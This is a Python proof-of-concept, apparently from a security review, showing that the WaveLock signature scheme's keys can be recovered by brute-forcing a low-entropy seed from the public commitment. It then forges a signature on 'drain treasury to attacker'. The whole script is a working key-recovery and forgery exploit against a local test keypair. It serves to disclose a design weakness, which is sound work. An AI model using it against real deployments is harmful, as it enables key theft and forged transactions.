"""
ATTACK CLASS 1 + 5 (Inversion via key-space search / scaling)
=============================================================
Even an attacker who is given ONLY the public commitment string
(WLv3.1:<sha256>:<sha3>) -- not the psi_star snapshot -- can recover the full
keypair, because the entire secret state is a deterministic function of a
single integer `seed`:

    seed --SHAKE256--> psi_0 --(50 fixed PDE steps)--> psi_star --hash--> commitment

The PDE's claimed "irreversibility" is irrelevant: we never invert it. We run
it FORWARD on candidate seeds and match the public commitment. The work factor
is therefore the entropy of `seed`, NOT anything about curvature.

The README/CLI examples use tiny integer seeds (e.g. --seed 42), so the real
key space in practice is whatever the operator typed, often << 2^32.

This script recovers the seed from the commitment, then forges.
"""
import time
import numpy as np
from wavelock.chain.Wavelock_numpy import CurvatureKeyPairV3


def recover_seed(target_commitment: str, max_seed: int = 200_000):
    t0 = time.time()
    for s in range(max_seed):
        kp = CurvatureKeyPairV3(n=4, seed=s)
        if kp.commitment == target_commitment:
            return s, kp, time.time() - t0
    return None, None, time.time() - t0


def main():
    print("=" * 70)
    print("WaveLock seed recovery: key space = seed entropy, not curvature")
    print("=" * 70)

    secret_seed = 31337
    victim = CurvatureKeyPairV3(n=4, seed=secret_seed)
    public_commitment = victim.commitment
    print(f"\n[public] commitment published: {public_commitment[:48]}...")
    print(f"[secret] true seed (unknown to attacker): {secret_seed}")

    # Time one forward evaluation to estimate work factor honestly.
    t = time.time()
    _ = CurvatureKeyPairV3(n=4, seed=0)
    per_seed = time.time() - t
    print(f"\n[cost] one forward keypair eval ~ {per_seed*1000:.2f} ms")
    print(f"[cost] => brute force rate ~ {1/per_seed:,.0f} seeds/sec/core")

    found, kp, elapsed = recover_seed(public_commitment, max_seed=secret_seed + 5)
    if found is None:
        print("\n[search] seed not found in window (raise max_seed)")
        return
    print(f"\n[search] RECOVERED seed = {found} in {elapsed:.2f}s "
          f"({found+1} forward evals)")

    # With recovered seed we reconstruct psi_star and forge anything.
    forged_msg = "drain treasury to attacker"
    sig = kp.sign(forged_msg)
    print(f"[forge] signature on '{forged_msg}': {sig[:24]}...")
    assert victim.verify(forged_msg, sig)
    print("[verify] victim.verify(forged) = True  -> FULL KEY RECOVERY")

    print("\nHonest work-factor estimate:")
    print(f"  - 32-bit seed: 2^32 * {per_seed*1000:.1f} ms ~ "
          f"{2**32*per_seed/86400:,.0f} core-days (feasible on a cluster)")
    print(f"  - 64-bit seed: only safe if operator actually uses 64 random bits;")
    print(f"    the security reduces to 'is the seed high-entropy?', i.e. a")
    print(f"    standard symmetric key, with the PDE adding only ~{per_seed*1000:.1f}ms/guess.")


if __name__ == "__main__":
    main()
